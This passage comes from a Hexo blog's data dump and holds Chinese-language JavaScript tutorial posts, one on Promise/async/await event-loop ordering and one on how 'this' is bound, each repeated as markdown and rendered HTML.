Promise(function(resolve){\n\n    console.log('promise1')\n\n    resolve();\n\n}).then(function(){\n\n    console.log('promise2')\n\n})\n\nconsole.log('script end')\n````\n求打印结果？\n\n题目考 js 事件循环和回调队列～ 假设看客已经了解 `setTimeout` 是`宏任务`会在`最后执行`的前提（因为它不是今天要讨论的重点），主要讨论 `promise`、`async` 和 `await` 之间的关系。\n\n个人思路：\n````\n1. console.log('script start')\n2. console.log('async1 start')\n   async2 开始执行\n   console.log('async1 end') 等待 async2\n3. \n4. \n\n````\n\n---\n\n## JS `执行机制` 及 `异步回调`( setTimeout / setInterval / Promise )\n\n`javascript执行机制` `代码执行顺序` `函数生命周期加载`等类似问题 都与`javascript执行机制`相关。\n\n1. 关于javascript\n`javascript`是一门`单线程语言`，在最新的`HTML5`中提出了`Web-Worker`，但`javascript是单线程这一核心仍未改变`。所以一切`javascript版的\"多线程\"都是用单线程模拟出来的`，一切javascript`多线程`都是`纸老虎`！\n2. javascript事件循环\n既然js是`单线程`，排队 办理业务, `js任务`也要一个一个顺序执行。如 `任务耗时过长`，后一个任务必须等着。浏览新闻 超清图片加载慢 需要异步加载 任务分为两类：\n+ 同步任务\n+ 异步任务\n  打开网站，`网页渲染` 过程 就是 `同步任务`，比如 `页面骨架`和 `页面元素`的`渲染`。而 `加载 图片 音乐`之类`占用资源大耗时久`的任务，就是`异步任务`。关于这部分有严格的文字定义，但本文的目的是用最小的学习成本彻底弄懂执行机制，所以我们用导图来说明：\n  ![js事件循环机制](https://img-blog.csdn.net/20171124105726497?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvaGFvYWlxaWFu/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast)\n导图要表达的内容用文字来表述的话：<br>\n`同步`和`异步`任务分别进入不同的`执行”场所”`，`同步的进入主线程`，`异步的进入Event Table并注册函数`。当指定的事情`完成`时，`Event Table`会将这个`函数` `移入Event Queue`。`主线程`内的任务`执行完`毕为空，会去`Event Queue`读取对应的函数，进入主线程执行。\n\n上述过程会不断重复，也就是常说的Event Loop(事件循环)。\n\n我们不禁要问了，那`怎么知道`主线程执行栈为空啊？js引擎存在`monitoring process`进程，会`持续不断检查`主线程执行栈是否为空，`一旦为空`，就会去`Event Queue`那里检查是否有`等待被调用的函数`。 \n说了这么多文字，不如直接一段代码更直白：略\n\n3. 又爱又恨的setTimeout\n\n\n(https://juejin.im/post/59e85eebf265da430d571f89)\n\n(https://blog.csdn.net/haoaiqian/article/details/78622651)\n\n---\n\n## `Async/Await`替代 `Promise` 的6个理由\n\n\n[阅读原文](https://www.cnblogs.com/fundebug/p/6667725.html)\n","source":"_posts/FrontEnd/JS/Promise-Async-await-运行时机制.md","raw":"---\ntitle: JavaScript运行时\ndate: 2018-05-31 10:47:18\ntags: JS运行时\ncategories: JS RunTime\n---\n## Promise Async/await 运行时机制\n故事要从一道今日头条的笔试题说起～ \n\n题目来源：[半年工作经验今日头条和美团面试题面经分享！！！！！](https://juejin.im/post/5b03e79951882542891913e8)\n\n````\nasync function async1(){\n\n    console.log('async1 start')\n\n    await async2()\n\n    console.log('async1 end')\n\n}\n\nasync function async2(){\n\n    console.log('async2')\n\n}\n\nconsole.log('script start')\n\nsetTimeout(function(){\n\n    console.log('setTimeout') \n\n},0)  \n\nasync1();\n\nnew Promise(function(resolve){\n\n    console.log('promise1')\n\n    resolve();\n\n}).then(function(){\n\n    console.log('promise2')\n\n})\n\nconsole.log('script end')\n````\n求打印结果？\n\n题目考 js 事件循环和回调队列～ 假设看客已经了解 `setTimeout` 是`宏任务`会在`最后执行`的前提（因为它不是今天要讨论的重点），主要讨论 `promise`、`async` 和 `await` 之间的关系。\n\n个人思路：\n````\n1. console.log('script start')\n2. console.log('async1 start')\n   async2 开始执行\n   console.log('async1 end') 等待 async2\n3. \n4. \n\n````\n\n---\n\n## JS `执行机制` 及 `异步回调`( setTimeout / setInterval / Promise )\n\n`javascript执行机制` `代码执行顺序` `函数生命周期加载`等类似问题 都与`javascript执行机制`相关。\n\n1. 关于javascript\n`javascript`是一门`单线程语言`，在最新的`HTML5`中提出了`Web-Worker`，但`javascript是单线程这一核心仍未改变`。所以一切`javascript版的\"多线程\"都是用单线程模拟出来的`，一切javascript`多线程`都是`纸老虎`！\n2. javascript事件循环\n既然js是`单线程`，排队 办理业务, `js任务`也要一个一个顺序执行。如 `任务耗时过长`，后一个任务必须等着。浏览新闻 超清图片加载慢 需要异步加载 任务分为两类：\n+ 同步任务\n+ 异步任务\n  打开网站，`网页渲染` 过程 就是 `同步任务`，比如 `页面骨架`和 `页面元素`的`渲染`。而 `加载 图片 音乐`之类`占用资源大耗时久`的任务，就是`异步任务`。关于这部分有严格的文字定义，但本文的目的是用最小的学习成本彻底弄懂执行机制，所以我们用导图来说明：\n  ![js事件循环机制](https://img-blog.csdn.net/20171124105726497?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvaGFvYWlxaWFu/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast)\n导图要表达的内容用文字来表述的话：<br>\n`同步`和`异步`任务分别进入不同的`执行”场所”`，`同步的进入主线程`，`异步的进入Event Table并注册函数`。当指定的事情`完成`时，`Event Table`会将这个`函数` `移入Event Queue`。`主线程`内的任务`执行完`毕为空，会去`Event Queue`读取对应的函数，进入主线程执行。\n\n上述过程会不断重复，也就是常说的Event Loop(事件循环)。\n\n我们不禁要问了，那`怎么知道`主线程执行栈为空啊？js引擎存在`monitoring process`进程，会`持续不断检查`主线程执行栈是否为空，`一旦为空`，就会去`Event Queue`那里检查是否有`等待被调用的函数`。 \n说了这么多文字，不如直接一段代码更直白：略\n\n3. 又爱又恨的setTimeout\n\n\n(https://juejin.im/post/59e85eebf265da430d571f89)\n\n(https://blog.csdn.net/haoaiqian/article/details/78622651)\n\n---\n\n## `Async/Await`替代 `Promise` 的6个理由\n\n\n[阅读原文](https://www.cnblogs.com/fundebug/p/6667725.html)\n","slug":"FrontEnd/JS/Promise-Async-await-运行时机制","published":1,"updated":"2018-09-05T06:33:18.457Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmrxzn009jzodv3ahhikjb","content":"<h2 id=\"Promise-Async-await-运行时机制\"><a href=\"#Promise-Async-await-运行时机制\" class=\"headerlink\" title=\"Promise Async/await 运行时机制\"></a>Promise Async/await 运行时机制</h2><p>故事要从一道今日头条的笔试题说起～ </p>\n<p>题目来源：<a href=\"https://juejin.im/post/5b03e79951882542891913e8\" target=\"_blank\" rel=\"noopener\">半年工作经验今日头条和美团面试题面经分享！！！！！</a></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">async function async1()&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    console.log(&apos;async1 start&apos;)</span><br><span class=\"line\"></span><br><span class=\"line\">    await async2()</span><br><span class=\"line\"></span><br><span class=\"line\">    console.log(&apos;async1 end&apos;)</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">async function async2()&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    console.log(&apos;async2&apos;)</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">console.log(&apos;script start&apos;)</span><br><span class=\"line\"></span><br><span class=\"line\">setTimeout(function()&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    console.log(&apos;setTimeout&apos;) </span><br><span class=\"line\"></span><br><span class=\"line\">&#125;,0)  </span><br><span class=\"line\"></span><br><span class=\"line\">async1();</span><br><span class=\"line\"></span><br><span class=\"line\">new Promise(function(resolve)&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    console.log(&apos;promise1&apos;)</span><br><span class=\"line\"></span><br><span class=\"line\">    resolve();</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;).then(function()&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    console.log(&apos;promise2&apos;)</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\">console.log(&apos;script end&apos;)</span><br></pre></td></tr></table></figure>\n<p>求打印结果？</p>\n<p>题目考 js 事件循环和回调队列～ 假设看客已经了解 <code>setTimeout</code> 是<code>宏任务</code>会在<code>最后执行</code>的前提（因为它不是今天要讨论的重点），主要讨论 <code>promise</code>、<code>async</code> 和 <code>await</code> 之间的关系。</p>\n<p>个人思路：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1. console.log(&apos;script start&apos;)</span><br><span class=\"line\">2. console.log(&apos;async1 start&apos;)</span><br><span class=\"line\">   async2 开始执行</span><br><span class=\"line\">   console.log(&apos;async1 end&apos;) 等待 async2</span><br><span class=\"line\">3. </span><br><span class=\"line\">4.</span><br></pre></td></tr></table></figure></p>\n<hr>\n<h2 id=\"JS-执行机制-及-异步回调-setTimeout-setInterval-Promise\"><a href=\"#JS-执行机制-及-异步回调-setTimeout-setInterval-Promise\" class=\"headerlink\" title=\"JS 执行机制 及 异步回调( setTimeout / setInterval / Promise )\"></a>JS <code>执行机制</code> 及 <code>异步回调</code>( setTimeout / setInterval / Promise )</h2><p><code>javascript执行机制</code> <code>代码执行顺序</code> <code>函数生命周期加载</code>等类似问题 都与<code>javascript执行机制</code>相关。</p>\n<ol>\n<li>关于javascript<br><code>javascript</code>是一门<code>单线程语言</code>，在最新的<code>HTML5</code>中提出了<code>Web-Worker</code>，但<code>javascript是单线程这一核心仍未改变</code>。所以一切<code>javascript版的&quot;多线程&quot;都是用单线程模拟出来的</code>，一切javascript<code>多线程</code>都是<code>纸老虎</code>！</li>\n<li>javascript事件循环<br>既然js是<code>单线程</code>，排队 办理业务, <code>js任务</code>也要一个一个顺序执行。如 <code>任务耗时过长</code>，后一个任务必须等着。浏览新闻 超清图片加载慢 需要异步加载 任务分为两类：</li>\n</ol>\n<ul>\n<li>同步任务</li>\n<li>异步任务<br>打开网站，<code>网页渲染</code> 过程 就是 <code>同步任务</code>，比如 <code>页面骨架</code>和 <code>页面元素</code>的<code>渲染</code>。而 <code>加载 图片 音乐</code>之类<code>占用资源大耗时久</code>的任务，就是<code>异步任务</code>。关于这部分有严格的文字定义，但本文的目的是用最小的学习成本彻底弄懂执行机制，所以我们用导图来说明：<br><img src=\"https://img-blog.csdn.net/20171124105726497?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvaGFvYWlxaWFu/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast\" alt=\"js事件循环机制\"><br>导图要表达的内容用文字来表述的话：<br><br><code>同步</code>和<code>异步</code>任务分别进入不同的<code>执行”场所”</code>，<code>同步的进入主线程</code>，<code>异步的进入Event Table并注册函数</code>。当指定的事情<code>完成</code>时，<code>Event Table</code>会将这个<code>函数</code> <code>移入Event Queue</code>。<code>主线程</code>内的任务<code>执行完</code>毕为空，会去<code>Event Queue</code>读取对应的函数，进入主线程执行。</li>\n</ul>\n<p>上述过程会不断重复，也就是常说的Event Loop(事件循环)。</p>\n<p>我们不禁要问了，那<code>怎么知道</code>主线程执行栈为空啊？js引擎存在<code>monitoring process</code>进程，会<code>持续不断检查</code>主线程执行栈是否为空，<code>一旦为空</code>，就会去<code>Event Queue</code>那里检查是否有<code>等待被调用的函数</code>。<br>说了这么多文字，不如直接一段代码更直白：略</p>\n<ol>\n<li>又爱又恨的setTimeout</li>\n</ol>\n<p>(<a href=\"https://juejin.im/post/59e85eebf265da430d571f89\" target=\"_blank\" rel=\"noopener\">https://juejin.im/post/59e85eebf265da430d571f89</a>)</p>\n<p>(<a href=\"https://blog.csdn.net/haoaiqian/article/details/78622651\" target=\"_blank\" rel=\"noopener\">https://blog.csdn.net/haoaiqian/article/details/78622651</a>)</p>\n<hr>\n<h2 id=\"Async-Await替代-Promise-的6个理由\"><a href=\"#Async-Await替代-Promise-的6个理由\" class=\"headerlink\" title=\"Async/Await替代 Promise 的6个理由\"></a><code>Async/Await</code>替代 <code>Promise</code> 的6个理由</h2><p><a href=\"https://www.cnblogs.com/fundebug/p/6667725.html\" target=\"_blank\" rel=\"noopener\">阅读原文</a></p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"Promise-Async-await-运行时机制\"><a href=\"#Promise-Async-await-运行时机制\" class=\"headerlink\" title=\"Promise Async/await 运行时机制\"></a>Promise Async/await 运行时机制</h2><p>故事要从一道今日头条的笔试题说起～ </p>\n<p>题目来源：<a href=\"https://juejin.im/post/5b03e79951882542891913e8\" target=\"_blank\" rel=\"noopener\">半年工作经验今日头条和美团面试题面经分享！！！！！</a></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">async function async1()&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    console.log(&apos;async1 start&apos;)</span><br><span class=\"line\"></span><br><span class=\"line\">    await async2()</span><br><span class=\"line\"></span><br><span class=\"line\">    console.log(&apos;async1 end&apos;)</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">async function async2()&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    console.log(&apos;async2&apos;)</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">console.log(&apos;script start&apos;)</span><br><span class=\"line\"></span><br><span class=\"line\">setTimeout(function()&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    console.log(&apos;setTimeout&apos;) </span><br><span class=\"line\"></span><br><span class=\"line\">&#125;,0)  </span><br><span class=\"line\"></span><br><span class=\"line\">async1();</span><br><span class=\"line\"></span><br><span class=\"line\">new Promise(function(resolve)&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    console.log(&apos;promise1&apos;)</span><br><span class=\"line\"></span><br><span class=\"line\">    resolve();</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;).then(function()&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    console.log(&apos;promise2&apos;)</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\">console.log(&apos;script end&apos;)</span><br></pre></td></tr></table></figure>\n<p>求打印结果？</p>\n<p>题目考 js 事件循环和回调队列～ 假设看客已经了解 <code>setTimeout</code> 是<code>宏任务</code>会在<code>最后执行</code>的前提（因为它不是今天要讨论的重点），主要讨论 <code>promise</code>、<code>async</code> 和 <code>await</code> 之间的关系。</p>\n<p>个人思路：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1. console.log(&apos;script start&apos;)</span><br><span class=\"line\">2. console.log(&apos;async1 start&apos;)</span><br><span class=\"line\">   async2 开始执行</span><br><span class=\"line\">   console.log(&apos;async1 end&apos;) 等待 async2</span><br><span class=\"line\">3. </span><br><span class=\"line\">4.</span><br></pre></td></tr></table></figure></p>\n<hr>\n<h2 id=\"JS-执行机制-及-异步回调-setTimeout-setInterval-Promise\"><a href=\"#JS-执行机制-及-异步回调-setTimeout-setInterval-Promise\" class=\"headerlink\" title=\"JS 执行机制 及 异步回调( setTimeout / setInterval / Promise )\"></a>JS <code>执行机制</code> 及 <code>异步回调</code>( setTimeout / setInterval / Promise )</h2><p><code>javascript执行机制</code> <code>代码执行顺序</code> <code>函数生命周期加载</code>等类似问题 都与<code>javascript执行机制</code>相关。</p>\n<ol>\n<li>关于javascript<br><code>javascript</code>是一门<code>单线程语言</code>，在最新的<code>HTML5</code>中提出了<code>Web-Worker</code>，但<code>javascript是单线程这一核心仍未改变</code>。所以一切<code>javascript版的&quot;多线程&quot;都是用单线程模拟出来的</code>，一切javascript<code>多线程</code>都是<code>纸老虎</code>！</li>\n<li>javascript事件循环<br>既然js是<code>单线程</code>，排队 办理业务, <code>js任务</code>也要一个一个顺序执行。如 <code>任务耗时过长</code>，后一个任务必须等着。浏览新闻 超清图片加载慢 需要异步加载 任务分为两类：</li>\n</ol>\n<ul>\n<li>同步任务</li>\n<li>异步任务<br>打开网站，<code>网页渲染</code> 过程 就是 <code>同步任务</code>，比如 <code>页面骨架</code>和 <code>页面元素</code>的<code>渲染</code>。而 <code>加载 图片 音乐</code>之类<code>占用资源大耗时久</code>的任务，就是<code>异步任务</code>。关于这部分有严格的文字定义，但本文的目的是用最小的学习成本彻底弄懂执行机制，所以我们用导图来说明：<br><img src=\"https://img-blog.csdn.net/20171124105726497?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvaGFvYWlxaWFu/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast\" alt=\"js事件循环机制\"><br>导图要表达的内容用文字来表述的话：<br><br><code>同步</code>和<code>异步</code>任务分别进入不同的<code>执行”场所”</code>，<code>同步的进入主线程</code>，<code>异步的进入Event Table并注册函数</code>。当指定的事情<code>完成</code>时，<code>Event Table</code>会将这个<code>函数</code> <code>移入Event Queue</code>。<code>主线程</code>内的任务<code>执行完</code>毕为空，会去<code>Event Queue</code>读取对应的函数，进入主线程执行。</li>\n</ul>\n<p>上述过程会不断重复，也就是常说的Event Loop(事件循环)。</p>\n<p>我们不禁要问了，那<code>怎么知道</code>主线程执行栈为空啊？js引擎存在<code>monitoring process</code>进程，会<code>持续不断检查</code>主线程执行栈是否为空，<code>一旦为空</code>，就会去<code>Event Queue</code>那里检查是否有<code>等待被调用的函数</code>。<br>说了这么多文字，不如直接一段代码更直白：略</p>\n<ol>\n<li>又爱又恨的setTimeout</li>\n</ol>\n<p>(<a href=\"https://juejin.im/post/59e85eebf265da430d571f89\" target=\"_blank\" rel=\"noopener\">https://juejin.im/post/59e85eebf265da430d571f89</a>)</p>\n<p>(<a href=\"https://blog.csdn.net/haoaiqian/article/details/78622651\" target=\"_blank\" rel=\"noopener\">https://blog.csdn.net/haoaiqian/article/details/78622651</a>)</p>\n<hr>\n<h2 id=\"Async-Await替代-Promise-的6个理由\"><a href=\"#Async-Await替代-Promise-的6个理由\" class=\"headerlink\" title=\"Async/Await替代 Promise 的6个理由\"></a><code>Async/Await</code>替代 <code>Promise</code> 的6个理由</h2><p><a href=\"https://www.cnblogs.com/fundebug/p/6667725.html\" target=\"_blank\" rel=\"noopener\">阅读原文</a></p>\n"},{"title":"JavaScript`this`原理","date":"2018-06-22T07:20:13.000Z","_content":"# JavaScript 的 this 原理\n## 一、问题的由来\n学懂 JavaScript 语言，一个标志就是理解下面两种写法，可能有不一样的结果。\n\n````\nvar obj = {\n  foo: function () {}\n};\nvar foo = obj.foo;\n// 写法一\nobj.foo()\n// 写法二\nfoo()\n````\n上面代码中，虽然obj.foo和foo指向同一个函数，但是执行结果可能不一样。请看下面的例子。\n\n````\nvar obj = {\n  foo: function () { console.log(this.bar) },\n  bar: 1\n};\nvar foo = obj.foo;\nvar bar = 2;\nobj.foo() // 1\nfoo() // 2\n````\n\n这种差异的原因，就在于函数体内部使用了`this`关键字。很多教科书会告诉你，this指的是函数运行时所在的环境。\n对于obj.foo()来说，foo运行在obj环境，所以this指向obj；对于foo()来说，foo运行在全局环境，所以this指向全局环境。所以，两者的运行结果不一样。\n\n这种解释没错，但是教科书往往不告诉你，为什么会这样？也就是说，函数的运行环境到底是怎么决定的？举例来说，为什么obj.foo()就是在obj环境执行，而一旦var foo = obj.foo，foo()就变成在全局环境执行？\n\n本文就来解释 JavaScript 这样处理的原理。理解了这一点，你就会彻底理解this的作用。\n\n## 二、内存的数据结构\nJavaScript 语言之所以有`this`的设计，跟`内存`里面的`数据结构`有关系。\n\n````\nvar obj = { foo:  5 };\n````\n\n上面的代码将一个`对象`赋值给变量`obj`。JavaScript 引擎会先在`内存`里面，`生成一个对象{ foo: 5 }`，然后把这个对象的`内存地址`赋值给变量obj。\n\n也就是说，变量obj是一个地址 (reference) 。后面如果要读取obj.foo，引擎先从obj拿到内存地址，然后再从该地址读出原始的对象，返回它的foo属性。\n\n`原始的对象`以`字典结构`保存，每一个属性名都`对应`一个属性描述对象。举例来说，上面例子的foo属性，实际上是以下面的形式保存的。\n\n**注意**：foo属性的值保存在属性描述对象的value属性里面。\n\n## 三、函数\n这样的结构是很清晰的，问题在于属性的值可能是一个`函数`。\n\n````\nvar obj = { foo: function () {} };\n````\n这时，引擎会将函数单独保存在内存中，然后再将函数的地址赋值给foo属性的value属性。\n\n````\n{\n  foo: {\n    [[value]]: 函数的地址\n    ...\n  }\n}\n````\n\n由于函数是一个单独的值，所以它可以在不同的环境（上下文）执行。\n\n````\nvar f = function () {};\nvar obj = { f: f };\n// 单独执行\nf()\n// obj 环境执行\nobj.f()\n````\n\n## 四、环境变量\nJavaScript 允许在函数体内部，引用当前环境的其他变量。\n````\nvar f = function () {\n  console.log(x);\n};\n````\n上面代码中，函数体里面使用了变量`x`。该变量由运行环境提供。\n\n现在问题就来了，由于函数可以在不同的运行环境执行，所以需要有一种机制，能够在`函数体内部获得当前的运行环境（context）`。所以，`this就出现`了，它的`设计目的`就是在函数体内部，指代函数当前的运行环境。\n\n````\nvar f = function () {\n  console.log(this.x);\n}\n````\n上面代码中，函数体里面的this.x就是指当前运行环境的x。\n\n````\nvar f = function () {\n  console.log(this.x);\n}\nvar x = 1;\nvar obj = {\n  f: f,\n  x: 2,\n};\n// 单独执行\nf() // 1\n// obj 环境执行\nobj.f() // 2\n````\n上面代码中，函数f在全局环境执行，this.x指向全局环境的x。\n![](https://mmbiz.qpic.cn/mmbiz_png/btsCOHx9LAOGjicfd5I43teJ3ickrLuhxcIaH1qiaI67Lt0fZ31q7eTFIqIBcg8mViacnWQD4MChFlaicu4HaUX4SKw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1)\n\n在obj环境执行，this.x指向obj.x\n![](https://mmbiz.qpic.cn/mmbiz_png/btsCOHx9LAOGjicfd5I43teJ3ickrLuhxco6hl0vCicIXHMat4Kgt1UgdoniaMMldWogk74hVyia9DIXBHbIe142BtQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1)\n\n回到本文开头提出的问题，obj.foo()是通过obj找到foo，所以就是在obj环境执行。一旦var foo = obj.foo，变量foo就直接指向函数本身，所以foo()就变成在全局环境执行。\n\n---\n[阅读原文](http://www.ruanyifeng.com/blog/2018/06/javascript-this.html) 作者：阮一峰","source":"_posts/FrontEnd/JS/JavaScript-this-原理.md","raw":"---\ntitle: JavaScript`this`原理\ndate: 2018-06-22 15:20:13\ntags: JS-this原理\ncategories: JS\n---\n# JavaScript 的 this 原理\n## 一、问题的由来\n学懂 JavaScript 语言，一个标志就是理解下面两种写法，可能有不一样的结果。\n\n````\nvar obj = {\n  foo: function () {}\n};\nvar foo = obj.foo;\n// 写法一\nobj.foo()\n// 写法二\nfoo()\n````\n上面代码中，虽然obj.foo和foo指向同一个函数，但是执行结果可能不一样。请看下面的例子。\n\n````\nvar obj = {\n  foo: function () { console.log(this.bar) },\n  bar: 1\n};\nvar foo = obj.foo;\nvar bar = 2;\nobj.foo() // 1\nfoo() // 2\n````\n\n这种差异的原因，就在于函数体内部使用了`this`关键字。很多教科书会告诉你，this指的是函数运行时所在的环境。\n对于obj.foo()来说，foo运行在obj环境，所以this指向obj；对于foo()来说，foo运行在全局环境，所以this指向全局环境。所以，两者的运行结果不一样。\n\n这种解释没错，但是教科书往往不告诉你，为什么会这样？也就是说，函数的运行环境到底是怎么决定的？举例来说，为什么obj.foo()就是在obj环境执行，而一旦var foo = obj.foo，foo()就变成在全局环境执行？\n\n本文就来解释 JavaScript 这样处理的原理。理解了这一点，你就会彻底理解this的作用。\n\n## 二、内存的数据结构\nJavaScript 语言之所以有`this`的设计，跟`内存`里面的`数据结构`有关系。\n\n````\nvar obj = { foo:  5 };\n````\n\n上面的代码将一个`对象`赋值给变量`obj`。JavaScript 引擎会先在`内存`里面，`生成一个对象{ foo: 5 }`，然后把这个对象的`内存地址`赋值给变量obj。\n\n也就是说，变量obj是一个地址 (reference) 。后面如果要读取obj.foo，引擎先从obj拿到内存地址，然后再从该地址读出原始的对象，返回它的foo属性。\n\n`原始的对象`以`字典结构`保存，每一个属性名都`对应`一个属性描述对象。举例来说，上面例子的foo属性，实际上是以下面的形式保存的。\n\n**注意**：foo属性的值保存在属性描述对象的value属性里面。\n\n## 三、函数\n这样的结构是很清晰的，问题在于属性的值可能是一个`函数`。\n\n````\nvar obj = { foo: function () {} };\n````\n这时，引擎会将函数单独保存在内存中，然后再将函数的地址赋值给foo属性的value属性。\n\n````\n{\n  foo: {\n    [[value]]: 函数的地址\n    ...\n  }\n}\n````\n\n由于函数是一个单独的值，所以它可以在不同的环境（上下文）执行。\n\n````\nvar f = function () {};\nvar obj = { f: f };\n// 单独执行\nf()\n// obj 环境执行\nobj.f()\n````\n\n## 四、环境变量\nJavaScript 允许在函数体内部，引用当前环境的其他变量。\n````\nvar f = function () {\n  console.log(x);\n};\n````\n上面代码中，函数体里面使用了变量`x`。该变量由运行环境提供。\n\n现在问题就来了，由于函数可以在不同的运行环境执行，所以需要有一种机制，能够在`函数体内部获得当前的运行环境（context）`。所以，`this就出现`了，它的`设计目的`就是在函数体内部，指代函数当前的运行环境。\n\n````\nvar f = function () {\n  console.log(this.x);\n}\n````\n上面代码中，函数体里面的this.x就是指当前运行环境的x。\n\n````\nvar f = function () {\n  console.log(this.x);\n}\nvar x = 1;\nvar obj = {\n  f: f,\n  x: 2,\n};\n// 单独执行\nf() // 1\n// obj 环境执行\nobj.f() // 2\n````\n上面代码中，函数f在全局环境执行，this.x指向全局环境的x。\n![](https://mmbiz.qpic.cn/mmbiz_png/btsCOHx9LAOGjicfd5I43teJ3ickrLuhxcIaH1qiaI67Lt0fZ31q7eTFIqIBcg8mViacnWQD4MChFlaicu4HaUX4SKw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1)\n\n在obj环境执行，this.x指向obj.x\n![](https://mmbiz.qpic.cn/mmbiz_png/btsCOHx9LAOGjicfd5I43teJ3ickrLuhxco6hl0vCicIXHMat4Kgt1UgdoniaMMldWogk74hVyia9DIXBHbIe142BtQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1)\n\n回到本文开头提出的问题，obj.foo()是通过obj找到foo，所以就是在obj环境执行。一旦var foo = obj.foo，变量foo就直接指向函数本身，所以foo()就变成在全局环境执行。\n\n---\n[阅读原文](http://www.ruanyifeng.com/blog/2018/06/javascript-this.html) 作者：阮一峰","slug":"FrontEnd/JS/JavaScript-this-原理","published":1,"updated":"2018-09-05T06:33:18.457Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmrxzp009mzodv1lbct3ik","content":"<h1 id=\"JavaScript-的-this-原理\"><a href=\"#JavaScript-的-this-原理\" class=\"headerlink\" title=\"JavaScript 的 this 原理\"></a>JavaScript 的 this 原理</h1><h2 id=\"一、问题的由来\"><a href=\"#一、问题的由来\" class=\"headerlink\" title=\"一、问题的由来\"></a>一、问题的由来</h2><p>学懂 JavaScript 语言，一个标志就是理解下面两种写法，可能有不一样的结果。</p>\n<figure class=\"highlight 